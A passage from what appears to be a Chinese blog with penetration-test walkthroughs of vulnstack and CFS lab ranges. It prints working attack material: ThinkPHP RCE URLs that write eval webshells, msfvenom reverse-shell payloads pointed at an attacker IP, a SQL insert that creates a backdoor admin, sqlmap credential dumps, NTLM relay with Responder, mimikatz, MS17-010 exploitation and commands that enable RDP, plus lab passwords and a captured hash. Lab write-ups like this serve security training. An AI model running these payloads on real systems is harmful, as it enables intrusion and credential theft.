<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`am2zu_users`</span></span><br><span class="line">   (<span class="symbol">`name`</span>, <span class="symbol">`username`</span>, <span class="symbol">`password`</span>, <span class="symbol">`params`</span>, <span class="symbol">`registerDate`</span>, <span class="symbol">`lastvisitDate`</span>, <span class="symbol">`lastResetTime`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">'Administrator2'</span>, <span class="string">'admin2'</span>,</span><br><span class="line">    <span class="string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="string">''</span>, NOW(), NOW(), NOW());</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`am2zu_user_usergroup_map`</span> (<span class="symbol">`user_id`</span>,<span class="symbol">`group_id`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">'8'</span>);</span><br></pre></td></tr></table></figure>

<p>写入成功，写得有点多,    注意要把多余的数据删除，不然无法获取shell</p>
<p> <img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102705488.png" alt="image-20210222102705488"></p>
<p>密码为secret</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102734544.png" alt="image-20210222102734544"></p>
<p><a href="http://192.168.31.54/administrator/进行后台登陆" target="_blank" rel="noopener">http://192.168.31.54/administrator/进行后台登陆</a></p>
<p>修改模板getshell，Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files-&gt;编辑error.php</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102800407.png" alt="image-20210222102800407"></p>
<p>shell地址<a href="http://192.168.31.54/[templates/beez3/error.php](http://192.168.1.110/templates/beez3/shell.php)" target="_blank" rel="noopener">http://192.168.31.54/[templates/beez3/error.php](http://192.168.1.110/templates/beez3/shell.php)</a></p>
<p>执行命令发现需要绕过disable_function</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103037936.png" alt="image-20210222103037936"></p>
<p>重新写入哥斯拉马绕过</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103101207.png" alt="image-20210222103101207"></p>
<p>信息收集</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103117999.png" alt="image-20210222103117999"></p>
<p>64位系统</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103150594.png" alt="image-20210222103150594"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>上线msf</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.31</span><span class="number">.49</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>上传后添加权限</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103416538.png" alt="image-20210222103416538"></p>
<p>执行后发现无法上线</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103403177.png" alt="image-20210222103403177"></p>
<p>再回过头去梳理下信息，发现ubuntu的ip和访问网站的ip地址不在同一网段，说明做了nginx反代，无法上线正常</p>
<p>此时突破口为nginx机子的22端口</p>
<p>翻看Webshell找到敏感文件</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103726277.png" alt="image-20210222103726277"></p>
<p>连接成功，收集信息</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103750325.png" alt="image-20210222103750325"></p>
<p>查看内核版本</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103811354.png" alt="image-20210222103811354"></p>
<p>将shell.elf上传至centos执行，获取shell</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103840036.png" alt="image-20210222103840036"></p>
<p>添加路由</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135127648.png" alt="image-20210222135127648"></p>
<p>扫描smb</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135155773.png" alt="image-20210222135155773"></p>
<p>扫到3台Windows主机</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135233953.png" alt="image-20210222135233953"></p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135246345.png" alt="image-20210222135246345"></p>
<p>尝试对win2008 smb爆破</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135305302.png" alt="image-20210222135305302"></p>
<p>卧槽无法爆破出来，看网上部分文章可以爆破出来，后续操作就会简单很多，既然无法爆破那就换思路</p>
<p>建立socks4a代理</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135331835.png" alt="image-20210222135331835"></p>
<p>vim /etc/proxychains.conf</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135349054.png" alt="image-20210222135349054"></p>
<p>proxifier建立好规则</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135410613.png" alt="image-20210222135410613"></p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135504712.png" alt="image-20210222135504712"></p>
<p>对3台主机进行端口探测</p>
<p>2012主机</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135535315.png" alt="image-20210222135535315"></p>
<p>2008主机</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135607091.png" alt="image-20210222135607091"></p>
<p>win7主机</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135625752.png" alt="image-20210222135625752"></p>
<p>根据扫描结果，可尝试从win7的3389或win2008的1433和3306进行突破，通过socks代理3389无法访问，3306无法连接，但1433连接成功，使用之前获取的mysql账户密码 成功登陆20主机的sqlserver</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135654511.png" alt="image-20210222135654511"></p>
<p>连接成功</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135707871.png" alt="image-20210222135707871"></p>
<p>后续思路为centos使用Responder监听20网卡，使20主机执行sqlserver漏洞获取hash</p>
<p>先对Centos进行提权操作不然无法使用Responder</p>
<p>内核版本大于2.6.22，可以使用脏牛漏洞提权<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a></p>
<p>教程参考：<a href="https://blog.csdn.net/nzjdsds/article/details/82935243" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82935243</a></p>
<p>成功提权</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135843821.png" alt="image-20210222135843821"></p>
<p>安装Responder</p>
<p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></p>
<p>Responder使用参考</p>
<p><a href="https://blog.csdn.net/nzjdsds/article/details/94314995" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/94314995</a></p>
<p>centos主机执行命令</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> Responder.<span class="keyword">py</span> -I eth1 -<span class="keyword">rv</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135913922.png" alt="image-20210222135913922"></p>
<p>使用auxiliary/admin/mssql/mssql_ntlm_stealer，执行xp_dirtree，触发UNC</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135942343.png" alt="image-20210222135942343"></p>
<p>centos成功坚挺到hash</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222140011311.png" alt="image-20210222140011311"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[MSSQL] Received<span class="built_in"> connection </span><span class="keyword">from</span> 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP<span class="built_in"> Client </span>  : 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:1122334455667788:5475B3B3A37DB6027BA8AB1F60142DB0:010100000000000080FC2E4B2D08D7012D4666B8C3BCCA970000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000E7FBA7E46F9C44F8F041B08F1FB7DA847A7BF7506335BED604BE8AB5F5F0A7C30000000000000000</span><br></pre></td></tr></table></figure>

<p>可以尝试使用john解密，但是字典不行跑不出来，那就继续渗透</p>
<p>尝试中继win2008打win7，发现端口占用</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143248066.png" alt="image-20210222143248066"></p>
<p>需要禁用Responder的http服务器，将相关服务更改为“Off”来禁用Responder.conf文件中的这些特定服务来完成任务。</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143313113.png" alt="image-20210222143313113"></p>
<p>还得关闭centos 80端口对应的nginx服务，这样如果是实战情况下动静太大了</p>
<p>重新开启服务</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143404108.png" alt="image-20210222143404108"></p>
<p>再开一个终端窗口<code>python MultiRelay.py -t 192.168.93.30 -u ALL</code></p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143435483.png" alt="image-20210222143435483"></p>
<p>msf再次执行</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143455692.png" alt="image-20210222143455692"></p>
<p>获取到win7的shell</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143524624.png" alt="image-20210222143524624"></p>
<p>使用MultiRelay自带mimikatz抓取win7凭据<code>mimi &quot;sekurlsa::logonpasswords&quot;</code></p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143604315.png" alt="image-20210222143604315"></p>
<p>因为win2008的administrator凭据可以中继到win7，所以win2008的密码和win7相同</p>
<p>msf使用psexec进行命令执行使用<code>auxiliary/admin/smb/psexec_command</code>模块</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143652316.png" alt="image-20210222143652316"></p>
<p>whoami执行结果如下</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143715307.png" alt="image-20210222143715307"></p>
<p>查看是否存在TEST域的administrator的进程</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143726794.png" alt="image-20210222143726794"></p>
<p>发现存在</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143800257.png" alt="image-20210222143800257"></p>
<p>后续思路为上传mimikatz到win2008获取域控的密码，再此之前先来看看能不能连上win2008的3389</p>
<p>通过psexec开启远程桌面命令如下</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">\#</span>设置远程桌面端口</span><br><span class="line"> reg add "HKLM<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\T</span>erminal Server<span class="symbol">\W</span>inStations<span class="symbol">\R</span>DP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"> <span class="symbol">\#</span>开启远程桌面</span><br><span class="line"> wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' call SetAllowTSConnections 1</span><br><span class="line"> <span class="symbol">\#</span>检查端口状态</span><br><span class="line"> netstat -an|find "3389"</span><br><span class="line"> <span class="symbol">\#</span>关闭远程桌面</span><br><span class="line"> wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' call SetAllowTSConnections 0</span><br></pre></td></tr></table></figure>

<p>Administrator/123qwe!ASD</p>
<p>连接成功</p>
<p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222144015827.png" alt="image-20210222144015827"></p>
<p>上传mimikatz</p>
<p>由于环境崩溃了，这个环境太大，反复崩溃，且虚拟机都为挂起状态，重新启动后有些环境就无法还原，后续思路为minikatz通过centos上传到win7，win7再传到win8，再通过获得的3389进入后查看密码。也可以尝试使用impacket中的psexec或者wmi来连接获取win2008的shell，然后再传入mimikatz</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_40989258/article/details/110377147" target="_blank" rel="noopener">https://blog.csdn.net/qq_40989258/article/details/110377147</a></p>
<p><a href="https://xz.aliyun.com/t/6988#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6988#toc-1</a> </p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>red team</tag>
      </tags>
  </entry>
  <entry>
    <title>cfs三层靶机渗透</title>
    <url>/2021/02/20/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>尝试下cfs三层靶机渗透，接近实战环境，因为要建立多层代理</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>拓扑图</p><p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219162819273.png" alt="image-20210219162819273"></p><p>各主机账号密码</p><p>Centos：root/ teamssix.com </p><p>Ubuntu：root/ teamssix.com</p><p>Win7：administrator/teamssix.com</p><p>Centos配置网站centos和ubuntu主机需如下配置</p><a id="more"></a>







<p>http://靶机外网ip:8888/a768f109/</p>
<p><strong>账号：</strong>eaj3yhsl，<strong>密码：</strong>41bb8fee，根据实际靶机ip，配置网站</p>
<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-O</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.19</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163006337.png" alt="image-20210219163006337"></p>
<p>访问80端口为thinkphp</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163032951.png" alt="image-20210219163032951"></p>
<p>尝试payload</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.1.19/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>

<p>存在漏洞</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210219163116499.png" alt="image-20210219163116499"></p>
<p>写入webshell</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.19</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=file_put_contents&amp;vars[<span class="number">1</span>][]=shell.php&amp;vars[<span class="number">1</span>][]=%3C?php%20@eval($_GET[%22code%22])?%3Ei</span><br><span class="line"><span class="comment">###注意结尾多了一个i</span></span><br></pre></td></tr></table></figure>

<p>查看写入成功</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094140826.png" alt="image-20210222094140826"></p>
<p>蚁剑连接失败</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094209040.png" alt="image-20210222094209040"></p>
<p>更换payload重新写入</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://192.168.1.19/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo%20%22%3C?php%20eval(\$<span class="emphasis">_POST[cmd]);?%3E%22%20%3Eshell.php</span></span><br></pre></td></tr></table></figure>

<p>写入成功，找到第一个flag</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094249920.png" alt="image-20210222094249920"></p>
<p>网络上还有另一种方法，我这边也来尝试下</p>
<p>Kali开启监听</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094507319.png" alt="image-20210222094507319"></p>
<p>反弹shell</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094456005.png" alt="image-20210222094456005"></p>
<p>使用python获取一枚 bash：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094547520.png" alt="image-20210222094547520"></p>
<p>找到第二个flag</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094613332.png" alt="image-20210222094613332"></p>
<p><code>uname -a</code>查看系统内核</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094633661.png" alt="image-20210222094633661"></p>
<p>尝试使用msf获取meterpreter</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094754241.png" alt="image-20210222094754241"></p>
<p>成功后上传修改权限</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094731943.png" alt="image-20210222094731943"></p>
<p>成功获取shell并收集一些信息</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094814005.png" alt="image-20210222094814005"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>添加路由</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094913700.png" alt="image-20210222094913700"></p>
<p>使用<code>auxiliary/scanner/portscan/tcp</code>进行端口扫描探测</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222094944830.png" alt="image-20210222094944830"></p>
<p>发现80端口放开</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095412834.png" alt="image-20210222095412834"></p>
<p>建立socks4a代理查看80端口内容</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095430702.png" alt="image-20210222095430702"></p>
<p>vim /etc/proxychains.conf</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095452316.png" alt="image-20210222095452316"></p>
<p>再来一波nmap端口探测</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">proxychains</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-sT</span> 192<span class="selector-class">.168</span><span class="selector-class">.192</span><span class="selector-class">.129</span></span><br><span class="line">##因为<span class="selector-tag">socket</span>代理不支持<span class="selector-tag">arp</span>，<span class="selector-tag">icmp</span>这种协议，所以用<span class="selector-tag">tcp</span>扫描</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095552921.png" alt="image-20210222095552921"></p>
<p>外网连接代理，下图有点问题，协议应为socks而非http</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095642724.png" alt="image-20210222095642724"></p>
<p>可以访问，但访问不到网站</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095756811.png" alt="image-20210222095756811"></p>
<p>此时需要根据提示重新配置下环境</p>
<p><a href="http://192.168.192.129:8888/2cc52ec0/" target="_blank" rel="noopener">http://192.168.192.129:8888/2cc52ec0/</a></p>
<p>使用xdynr37d/766e248d无法登陆</p>
<p>直接在主机输入命令修改密码</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/www/server/panel</span> &amp;&amp; python tools.pyc panel testpasswd</span><br><span class="line"><span class="comment">##密码修改为testpasswd</span></span><br></pre></td></tr></table></figure>

<p>xdynr37d/testpasswd登陆</p>
<p>进行网站添加</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095940237.png" alt="image-20210222095940237"></p>
<p>再次访问成功</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222095955024.png" alt="image-20210222095955024"></p>
<p>通过代理进行目录探测</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">proxychains dirb <span class="string">http:</span><span class="comment">//192.168.192.129</span></span><br></pre></td></tr></table></figure>

<p>部分扫描结果，发现robots.txt</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100041306.png" alt="image-20210222100041306"></p>
<p>查看robots.txt发现敏感信息</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100142236.png" alt="image-20210222100142236"></p>
<p>找到后台</p>
<p><a href="http://192.168.192.129/index.php?r=admini/public/login" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=admini/public/login</a></p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100225044.png" alt="image-20210222100225044"></p>
<p>再查看首页源代码，发现注入点</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100310646.png" alt="image-20210222100310646"></p>
<p>kali下使用代理开启sqlmap</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">proxychains sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -<span class="selector-tag">p</span> keyword</span><br></pre></td></tr></table></figure>

<p>发现注入漏洞</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100350846.png" alt="image-20210222100350846"></p>
<p>一步步渗透注入，最后获取用户密码</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">proxychains</span> sqlmap <span class="string">"-u http://192.168.192.129/index.php?r=vul&amp;keyword=1"</span> -p keyword -D <span class="keyword">bagecms </span>-T <span class="keyword">bage_admin </span>-C username,password –dump</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100429097.png" alt="image-20210222100429097"></p>
<p>登陆后台找到第三个flag</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100450890.png" alt="image-20210222100450890"></p>
<p>在后台模版文件写shell</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100538199.png" alt="image-20210222100538199"></p>
<p>尝试写入webshell</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100709005.png" alt="image-20210222100709005"></p>
<p>讲蚁剑上传到kali，代理启动</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">proxychains <span class="string">./AntSword</span></span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.192.129/index.php?r=tag" target="_blank" rel="noopener">http://192.168.192.129/index.php?r=tag</a></p>
<p>连接成功</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100834380.png" alt="image-20210222100834380"></p>
<p>找到第四个flag</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100853644.png" alt="image-20210222100853644"></p>
<p>连接非常不稳定，尝试下Kali自带的Webshell管理工具Weevely，发现更不稳定</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222100931875.png" alt="image-20210222100931875"></p>
<p>尝试获取meterpreter，生成一个正向马去连接ubuntu</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">5555</span> -f elf &gt; <span class="number">5555.</span>elf</span><br></pre></td></tr></table></figure>

<p>代理形式打开msf，<code>proxychains msfconsole</code></p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101050169.png" alt="image-20210222101050169"></p>
<p>连接成功，获取meterpreter</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101151211.png" alt="image-20210222101151211"></p>
<p>查看网段信息</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101212102.png" alt="image-20210222101212102"></p>
<p>继续建立新的路由<code>run autoroute -s 192.168.33.0/24</code></p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101247682.png" alt="image-20210222101247682"></p>
<p>端口扫描</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101311165.png" alt="image-20210222101311165"></p>
<p>看扫描结果推测为windows主机</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101340357.png" alt="image-20210222101340357"></p>
<p>尝试使用smb协议探测，使用模块<code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101416808.png" alt="image-20210222101416808"></p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101433455.png" alt="image-20210222101433455"></p>
<p>445端口开放，再尝试ms17-010漏洞探测</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101507601.png" alt="image-20210222101507601"></p>
<p>存在漏洞</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101529006.png" alt="image-20210222101529006"></p>
<p>使用<code>exploit/windows/smb/ms17_010_psexec</code>进行权限获取</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101643982.png" alt="image-20210222101643982"></p>
<p>设置正向连接payload</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101707588.png" alt="image-20210222101707588"></p>
<p>获取权限成功</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101727151.png" alt="image-20210222101727151"></p>
<p>找到第五个flag</p>
<p><img src="//choge.top/2021/02/20/cfs三层靶机渗透/image-20210222101753208.png" alt="image-20210222101753208"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4MTkzNDIyMg==&amp;mid=2247488522&amp;idx=1&amp;sn=372d9a0ecf3926f84e9f4bc24c6040fd&amp;source=41#wechat_redirect</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>red team</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1靶机实战</title>
    <url>/2021/02/19/vulnstack1%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>尝试下vulnstack1的靶机实战</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>密码：登录密码为hongrisec@2019 但是首次登陆必须改密码，密码改为hongrisec@2019.</p><p>拓扑图</p><p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154153622.png" alt="image-20210219154153622"></p><p>vm1对应 win7，外网服务器，vm2对应win2003，vm3对应win2008</p><a id="more"></a>





<p>vm1设置两个网卡，一个自定义连接到VMnet1(仅主机模式)，另一个连接模式为NAT，方便连接外网。</p>
<p>vm2和vm3为仅主机模式</p>
<p>手工绘制拓扑图如下</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154211980.png" alt="image-20210219154211980"></p>
<p>vm1开启phpstudy</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154243444.png" alt="image-20210219154243444"></p>
<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">nmap -P0 -p1<span class="number">-65535</span> -A -T4 <span class="number">172.16</span><span class="number">.237</span><span class="number">.6</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154457223.png" alt="image-20210219154457223"></p>
<p>使用wufzz进行目录探测</p>
<p><img src="//choge.top/2021/02/19/vulnstack1靶机实战/image-20210219154527170.png" alt="image-20210219154527170"></p>
<p>竟然没扫到，使用dirmap工具爆破</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">dirmap</span><span class="selector-class">.py</span> <span class="selector-tag">-i</span> 172<span class="selector-class">.16</span><span class="selector-class">.237</span><span class="selector-class">.6</span> <span class="selector-tag">-lcf</span></span><br></pre></td></tr></table></figure>

